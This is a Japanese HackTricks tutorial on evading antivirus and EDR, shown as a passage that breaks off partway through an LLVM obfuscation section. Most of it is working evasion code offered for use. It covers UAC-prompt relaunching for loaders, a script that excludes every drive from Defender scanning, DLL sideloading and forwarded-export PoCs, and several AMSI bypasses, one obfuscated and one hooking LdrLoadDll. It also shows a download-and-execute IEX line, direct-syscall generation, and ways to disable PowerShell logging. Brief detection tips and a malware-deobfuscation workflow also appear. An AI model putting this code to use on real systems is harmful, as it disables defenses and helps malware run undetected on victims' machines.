# Antivirus (AV) のバイパス

{{#include ../banners/hacktricks-training.md}}

**このページの初稿は** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**

## Defenderを停止する

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderを停止させるツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVになりすましてWindows Defenderを停止させるツール。
- [管理者の場合にDefenderを無効化する](basic-powershell-for-pentesters/README.md)

### Defenderを改ざんする前にインストーラー風のUAC誘導を行う

ゲームチートを装った公開ローダーは、未署名のNode.js/Nexeインストーラーとして配布され、最初に**ユーザーに昇格を求めてから**Defenderを無効化することがよくあります。手順はシンプルです。

1. `net session`を使って管理者権限の有無を確認します。このコマンドは呼び出し元が管理者権限を持つ場合にのみ成功するため、失敗した場合、ローダーは標準ユーザーとして実行されています。
2. 元のコマンドラインを保持したまま、`RunAs`動詞を使って直ちに自身を再起動し、想定されたUAC同意プロンプトを表示します。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

被害者はすでに「クラック版」ソフトウェアをインストールしていると思っているため、通常はプロンプトを承認し、マルウェアに Defender のポリシーを変更するための権限を与えてしまいます。<sup>[[26]](#references)</sup>

### すべてのドライブ文字に対する一律の `MpPreference` 除外設定

昇格後、GachiLoader のような手法では、サービスを完全に無効化するのではなく、Defender の検出の隙を最大限に広げます。ローダーはまず GUI のウォッチドッグを停止し（`taskkill /F /IM SecHealthUI.exe`）、次に**極めて広範な除外設定**を追加して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン対象外にします。

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

主な観察点:

- このループは、マウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置される payload はすべて無視されます**。
- `.sys` 拡張子の除外は将来を見越したものです。攻撃者は、後から Defender に再度触れることなく、署名されていないドライバーを読み込める選択肢を残しておきます。
- 変更はすべて `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に保存されるため、後続のステージでは、UACを再度起動させることなく除外設定が保持されているか確認したり、設定を追加したりできます。

Defender のサービスは停止されないため、単純なヘルスチェックでは「アンチウイルスは有効」と報告され続けますが、実際にはリアルタイム検査がそれらのパスを確認することはありません。<sup>[[26]](#references)</sup>

## **AV回避の手法**

現在、AVはファイルが悪意のあるものかどうかを確認するために、静的検知、動的解析、そしてより高度なEDRでは振る舞い分析など、さまざまな手法を使用しています。

### **静的検知**

静的検知では、バイナリやスクリプト内の既知の悪意ある文字列やバイト列を検出するほか、ファイル自体から情報（ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）を抽出します。そのため、既知の公開ツールを使うと、すでに解析されて悪意あるものとしてフラグが立てられている可能性が高く、検出されやすくなります。この種の検知を回避する方法はいくつかあります。

- **暗号化**

バイナリを暗号化すれば、AVがプログラムを検知できなくなりますが、メモリ上でプログラムを復号して実行するための何らかの loader が必要になります。

- **難読化**

バイナリやスクリプト内の文字列を変更するだけでAVをすり抜けられる場合もありますが、難読化の対象によっては時間のかかる作業になります。

- **独自ツールの開発**

独自のツールを開発すれば、既知の不正なシグネチャは存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defenderの静的検知を確認するには、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)がおすすめです。このツールはファイルを複数のセグメントに分割し、それぞれをDefenderに個別にスキャンさせます。これにより、バイナリ内のどの文字列やバイト列にフラグが立てられたかを正確に確認できます。

実践的なAV回避については、こちらの[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### **動的解析**

動的解析とは、AVがバイナリをサンドボックス内で実行し、悪意ある動作（ブラウザーのパスワードを復号して読み取ろうとする、LSASSのminidumpを取得するなど）を監視することです。この部分への対処は少し難しい場合がありますが、サンドボックスを回避するためにできることをいくつか紹介します。

- **実行前にスリープする** 実装方法によっては、AVの動的解析を回避するのに有効です。AVがユーザーの作業を妨げないようにファイルをスキャンできる時間は非常に短いため、長時間スリープさせるとバイナリの解析を妨げられます。ただし、多くのAVサンドボックスでは、実装方法によってはスリープをスキップできます。
- **マシンのリソースを確認する** 通常、サンドボックスのリソースは非常に限られています（例: RAMが2GB未満）。そうでなければ、ユーザーのマシンの動作が遅くなる可能性があるためです。また、CPU温度やファンの回転速度を確認するなど、工夫の余地もあります。こうした要素はサンドボックスで必ずしも実装されているとは限りません。
- **マシン固有のチェックを行う** 「contoso.local」ドメインに参加しているワークステーションのユーザーを標的にしたい場合、コンピューターのドメインが指定したものと一致するか確認できます。一致しなければ、プログラムを終了させます。

Microsoft Defenderのサンドボックスのコンピューター名はHAL9THです。そのため、実行前にマルウェア内でコンピューター名を確認できます。名前がHAL9THであれば、Defenderのサンドボックス内にいることを意味するので、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

サンドボックスに対処するための、[@mgeeky](https://twitter.com/mariuszbit)によるその他の役立つヒントです。

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>

この記事で前述したとおり、**公開ツール**はいずれ**検知される**ため、次のことを自問してみてください。

たとえば、LSASSをダンプしたい場合、**本当にmimikatzを使う必要がありますか**？ それとも、あまり知られていない別のプロジェクトでLSASSをダンプできますか？

おそらく、後者が正解です。mimikatzを例にすると、AVやEDRで最も多く検知されるマルウェアの一つです。プロジェクト自体はとても優れていますが、AVを回避するために使うのは非常に厄介です。実現したいことに合わせて、代替手段を探しましょう。

> [!TIP]
> 回避のためにpayloadを変更する際は、Defenderの**サンプルの自動送信をオフにする**ようにしてください。また、長期的な回避を目指すなら、**絶対にVirusTotalにアップロードしないでください**。特定のAVでpayloadが検知されるか確認したい場合は、VMにそのAVをインストールし、サンプルの自動送信をオフにして、結果に納得できるまでVM上でテストしてください。

## EXEとDLL

可能な場合は常に、回避には**DLLの使用を優先してください**。私の経験では、DLLファイルは通常、**検知や解析を受ける可能性がはるかに低い**ため、payloadをDLLとして実行する方法がある場合には、検知を避けるための非常に簡単な手段になります。

この画像でわかるように、HavocのDLL Payloadはantiscan.meで4/26の検知率ですが、EXE payloadは7/26の検知率です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常のHavoc EXE payloadとHavoc DLLのantiscan.meでの比較</p></figcaption></figure>

ここからは、DLLファイルを使ってさらにステルス性を高めるためのテクニックをいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading**は、ローダーが使用するDLL検索順序を利用し、標的アプリケーションと悪意あるpayloadを同じ場所に配置します。

[ Siofra](https://github.com/Cybereason/siofra)と以下のPowerShellスクリプトを使って、DLL Sideloadingの影響を受けやすいプログラムを確認できます。

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

このコマンドは、"C:\Program Files\\" 内にあるDLL hijackingの影響を受けるプログラムと、それらが読み込もうとするDLLファイルの一覧を出力します。

**DLL Hijackable/Sideloadable programsを自分で調べることを強くおすすめします**。この手法は適切に実行すればかなりステルス性が高いですが、公開されているDLL Sideloadable programsを使うと、簡単に検知される可能性があります。

プログラムが読み込もうとする名前の悪意あるDLLを配置するだけでは、payloadは読み込まれません。プログラムはそのDLL内に特定の関数があることを期待しているためです。この問題を解決するために、**DLL Proxying/Forwarding**という別の手法を使います。

**DLL Proxying**は、プログラムがproxy（悪意ある）DLLに対して行う呼び出しを元のDLLに転送します。これにより、プログラムの機能を維持しながらpayloadを実行できます。

[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。

以下が実施した手順です：

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最後のコマンドで、2つのファイルが生成されます。DLLのソースコードテンプレートと、名前を変更した元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

これが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

[SGN](https://github.com/EgeBalci/sgn)でエンコードしたshellcodeとproxy DLLの両方が、[antiscan.me](https://antiscan.me)で検出率0/26でした！成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloadingについての理解を深めるために、[S3cur3Th1sSh1tのTwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecの動画](https://www.youtube.com/watch?v=3eROsG_WNpE)を**強くおすすめ**します。どちらも、ここで取り上げた内容をより詳しく解説しています。

### Forwarded Exportsの悪用（ForwardSideLoading）

Windows PEモジュールは、実際には「forwarder」である関数をエクスポートできます。つまり、エクスポートエントリはコードを指すのではなく、`TargetDll.TargetFunc`形式のASCII文字列を含みます。呼び出し元がそのエクスポートを解決すると、Windows loaderは次の処理を行います。

- `TargetDll`がまだロードされていない場合はロードする
- そこから`TargetFunc`を解決する

理解しておくべき主な動作：
- `TargetDll`がKnownDLLの場合、保護されたKnownDLLs namespace（例：ntdll、kernelbase、ole32）から提供されます。<sup>[[15]](#references)</sup>
- `TargetDll`がKnownDLLでない場合は、通常のDLL検索順序が使われます。この検索順序には、forward解決を行うモジュールのディレクトリも含まれます。

これにより、間接的なsideloadingの手法が可能になります。関数がKnownDLLではないモジュール名にforwardされている署名済みDLLを見つけ、その署名済みDLLと同じ場所に、forward先のモジュールと完全に同じ名前を付けた攻撃者制御のDLLを配置します。forwardされたエクスポートが呼び出されると、loaderはforwardを解決し、同じディレクトリから自身のDLLをロードして、DllMainを実行します。<sup>[[13]](#references)</sup>

Windows 11で確認された例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（コピー＆ペースト）:
1) 署名済みのシステム DLL を書き込み可能なフォルダーにコピーします。
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダーに悪意のある `NCRYPTPROV.dll` を配置します。DllMain を実行させるには、最小限の DllMain で十分です。DllMain をトリガーするために、転送先の関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 署名済みLOLBinでフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) が side-by-side の `keyiso.dll` (signed) をロードする
- `KeyIsoSetAuditingInterface` を解決する際、loader は forward をたどって `NCRYPTPROV.SetAuditingInterface` に進む
- その後、loader は `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合でも、「missing API」エラーが発生するのは `DllMain` の実行後

Hunting tips:
- target module が KnownDLL ではない forwarded exports に注目してください。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` にあります。
- 次のようなツールを使って forwarded exports を列挙できます:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を探すには、Windows 11 の forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

検知・防御のアイデア:
- LOLBins（例: rundll32.exe）がシステム以外のパスから署名済み DLL を読み込み、その後、同じディレクトリから同じベース名を持つ非 KnownDLLs を読み込む動作を監視する
- 次のようなプロセス／モジュールの連鎖を検知する: `rundll32.exe` → システム以外の `keyiso.dll` → ユーザーが書き込み可能なパスにある `NCRYPTPROV.dll`
- コード整合性ポリシー（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの書き込みと実行を禁止する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze は、一時停止されたプロセス、直接 syscall、代替の実行方法を使って EDR を回避するための payload toolkit です`

Freeze を使うと、ステルス性を保ちながら shellcode をロードして実行できます。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionは猫とネズミの追いかけっこのようなもので、今日有効な手法が明日には検出される可能性があります。そのため、ツールを1つだけに頼らず、可能であれば複数のEvasion手法を組み合わせてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRは、`ntdll.dll` のsyscall stubに**user-mode inline hook**を仕掛けることがよくあります。これらのhookを回避するには、正しい**SSN**（System Service Number）をロードし、hookされたexport entrypointを実行せずにkernel modeへ遷移する**direct**または**indirect** syscall stubを生成できます。<sup>[[32]](#references)</sup>

**呼び出し方法:**
- **Direct (embedded)**: 生成されたstubに `syscall`/`sysenter`/`SVC #0` 命令を出力します（`ntdll` exportを経由しません）。
- **Indirect**: `ntdll`内にある既存の`syscall` gadgetへジャンプし、kernelへの遷移が`ntdll`から発生したように見せます（heuristic evasionに有効です）。**randomized indirect**では、呼び出しごとにpoolからgadgetを選択します。
- **Egg-hunt**: 静的な`0F 05` opcode sequenceをディスク上に埋め込まず、実行時にsyscall sequenceを解決します。

**hook耐性のあるSSN解決方法:**
- **FreshyCalls (VA sort)**: stubのbyteを読み取る代わりに、syscall stubをvirtual address順に並べてSSNを推定します。
- **SyscallsFromDisk**: クリーンな `\KnownDlls\ntdll.dll` をmapし、その`.text`からSSNを読み取ってからunmapします（メモリ上のすべてのhookを回避します）。
- **RecycledGate**: VA順によるSSN推定と、stubがクリーンな場合のopcode検証を組み合わせます。hookされている場合はVA推定にフォールバックします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使って実行時に`EAX`からSSNを取得します。hookされたbyteの解析は不要です。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVがスキャンできるのは**ディスク上のファイル**だけでした。そのため、ペイロードを何らかの方法で**メモリ上で直接**実行できれば、AVにはそれを防ぐための十分な可視性がなく、何もできませんでした。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- User Account Control（UAC、EXE、COM、MSI、またはActiveXのインストール時の昇格）
- PowerShell（スクリプト、対話的な使用、動的なコード評価）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、スクリプトの内容を暗号化も難読化もされていない形式で公開し、ウイルス対策ソリューションがスクリプトの動作を検査できるようになります。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、スクリプトを実行した実行ファイルのパスが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにはファイルを一切書き込みませんでしたが、AMSIによってメモリ上で検出されました。

さらに、**.NET 4.8**以降では、C#コードもAMSIを通じて実行されます。これは、メモリ上で実行するための`Assembly.Load(byte[])`にも影響します。そのため、AMSIを回避してメモリ上で実行する場合は、古いバージョンの.NET（4.7.2以下など）の使用が推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主に静的検出を行うため、読み込もうとするスクリプトを変更すれば、検出を回避できる可能性があります。

ただし、AMSIには複数のレイヤーがあるスクリプトであっても難読化を解除する機能があります。そのため、やり方によっては難読化が有効な選択肢にならないこともあり、回避はそれほど単純ではありません。一方で、変数名をいくつか変更するだけでうまくいく場合もあるため、どの程度検出対象になっているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（cscript.exe、wscript.exeなども同様）のプロセスに読み込むことで実装されているため、非特権ユーザーとして実行していても簡単に改変できます。AMSIの実装にこの欠陥があるため、研究者たちはAMSIスキャンを回避する方法を複数発見しています。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスではスキャンが開始されなくなります。これは当初[Matt Graeber](https://twitter.com/mattifestation)によって公開され、その後Microsoftは広範な悪用を防ぐためのシグネチャを開発しました。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

現在の PowerShell プロセスで AMSI を使用不能にするのに必要だったのは、PowerShell コードを1行実行することだけでした。当然、このコード自体は AMSI に検知されるため、この手法を使うには何らかの変更が必要です。

以下は、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から引用した、改変済みの AMSI バイパスです。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

この投稿が公開された後に検知される可能性が高いことを念頭に置いてください。検知を避け続ける予定なら、コードは公開しないでください。

**Memory Patching**

この手法は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。amsi.dll 内の「AmsiScanBuffer」関数（ユーザーが入力した内容のスキャンを担当）のアドレスを見つけ、E_INVALIDARG のコードを返す命令で上書きします。これにより、実際のスキャン結果は 0 となり、クリーンな結果として解釈されます。

> [!TIP]
> 詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

powershell で AMSI を回避するために使われる手法は他にも多数あります。詳しくは[**このページ**](basic-powershell-for-pentesters/index.html#amsi-bypass)と[**この repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をご覧ください。

### amsi.dll の読み込みを防いで AMSI をブロックする（LdrLoadDll hook）

AMSI は、現在のプロセスに `amsi.dll` が読み込まれた後にのみ初期化されます。堅牢で言語に依存しない bypass は、`ntdll!LdrLoadDll` に user-mode hook を設置し、要求されたモジュールが `amsi.dll` の場合にエラーを返す方法です。その結果、AMSI は読み込まれず、そのプロセスではスキャンが行われません。<sup>[[23]](#references)</sup>

実装の概要（x64 C/C++ 疑似コード）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
補足
- PowerShell、WScript/CScript、カスタムローダーなど、AMSIを読み込むものならどれでも動作します。
- 長いコマンドラインの痕跡を避けるため、スクリプトを stdin 経由で渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と併用してください。
- `DllRegisterServer` を呼び出す `regsvr32` など、LOLBins 経由で実行されるローダーでの使用が確認されています。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** も、AMSIをバイパスするスクリプトを生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** も、ランダム化されたユーザー定義関数、変数、文字式を使ってシグネチャを回避し、PowerShell キーワードの大文字・小文字をランダムに変更してシグネチャを避けるスクリプトを生成します。

**検出されたシグネチャを削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などのツールを使うと、現在のプロセスのメモリから検出された AMSI シグネチャを削除できます。このツールは、現在のプロセスのメモリをスキャンして AMSI シグネチャを探し、NOP 命令で上書きすることで、メモリから実質的に削除します。

**AMSIを使用するAV/EDR製品**

AMSIを使用するAV/EDR製品の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**PowerShell バージョン 2 を使用する**
PowerShell バージョン 2 では AMSI が読み込まれないため、AMSI によるスキャンを受けずにスクリプトを実行できます。次のように実行できます。

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。監査やトラブルシューティングに役立ちますが、**検出を回避したい攻撃者にとっては問題となる場合もあります**。

PowerShell loggingを回避するには、次の手法を使用できます。

- **PowerShell TranscriptionとModule Loggingを無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)などのツールを使用できます。
- **Powershell version 2を使用する**: PowerShell version 2を使用するとAMSIが読み込まれないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **unmanaged PowerShell sessionを使用する**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)を使用して、`powershell.exe`を起動せずにPowerShellをホストします（Cobalt Strikeの`powerpick`で使われている手法です）。これにより、`powershell.exe`プロセスに特化した制御は回避できますが、AMSI、Script Block Logging、その他すべてのPowerShell防御が本質的に無効になるわけではありません。保護範囲はruntimeとhostの実装によって異なります。


## 難読化

> [!TIP]
> 複数の難読化手法ではデータを暗号化するため、バイナリのエントロピーが高くなり、AVやEDRに検出されやすくなります。この点に注意し、暗号化はコード内の機密性の高い部分や隠す必要がある部分だけに適用することを検討してください。

### ConfuserExで保護された.NETバイナリの難読化解除

ConfuserEx 2（または商用fork）を使用したマルウェアを解析する際には、逆コンパイラやsandboxを妨げる複数の保護レイヤーに直面することがよくあります。以下のワークフローを使うと、確実に**ほぼ元のILを復元**でき、その後dnSpyやILSpyなどのツールでC#に逆コンパイルできます。<sup>[[10]](#references)</sup>

1.  Anti-tamperingの除去 – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内で復号します。また、PE checksumにパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使って暗号化されたmetadata tableを特定し、XOR keyを復元して、クリーンなassemblyを書き出します。
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   出力には、独自の unpacker を作成する際に役立つ可能性のある6つの anti-tamper パラメータ（`key0-key3`、`nameHash`、`internKey`）が含まれます。

2.  シンボル／制御フローの復元 – *clean* ファイルを **de4dot-cex**（de4dot の ConfuserEx 対応フォーク）に渡します。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   フラグ:
     • `-p crx` – ConfuserEx 2 プロファイルを選択
     • de4dot は control-flow flattening を解除し、元の名前空間、クラス、変数名を復元して、定数文字列を復号します。

3.  Proxy-call stripping – ConfuserEx は、逆コンパイルをさらに困難にするため、直接のメソッド呼び出しを軽量なラッパー（*proxy calls* とも呼ばれます）に置き換えます。**ProxyCall-Remover** で削除します:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、`Class8.smethod_10` などの不透明なラッパー関数ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`/`TripleDESCryptoServiceProvider` の使用箇所を検索して、*実際の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV エンコード済みのバイト配列として payload を保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業するときに便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。この属性は IOC として利用でき、サンプルの自動トリアージに役立ちます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアセキュリティを強化できる、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、コンパイラも変更せずに、`C++11/14`言語を使ってコンパイル時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成される、obfuscated operationsのレイヤーを追加します。これにより、アプリケーションをクラックしようとする人の作業を少し難しくできます。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイル向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming) を使用する、LLVM対応言語向けのきめ細かなcode obfuscation frameworkです。ROPfuscatorは、通常の命令をROP chainsに変換してassembly codeレベルでプログラムをobfuscateし、通常のcontrol flowに対する直感的な理解を覆します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは既存のEXE/DLLをshellcodeに変換し、ロードできます

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけmaskする代わりに、改変したLLVM X86 backendを使うと、選択した関数を非アクティブな間、常にXOR-maskされた状態にできます。Function Peekaboo PoCは、demangled nameに`REG_`を含む関数を選択し、最終的なmachine codeの前後にposition-independentなentry/exit stubsを挿入して、`.text`に共有のmasking handlerを1つ出力します。ソースレベルのシグネチャとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、instruction selectionと最適化の後に行う必要があります。すべての出力対象returnを処理し、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`で最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加されたepilogueにフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、コンパイラ生成のstack/frame teardownは維持し、return命令だけをリダイレクトします。<sup>[[38]](#references)[[39]](#references)</sup>

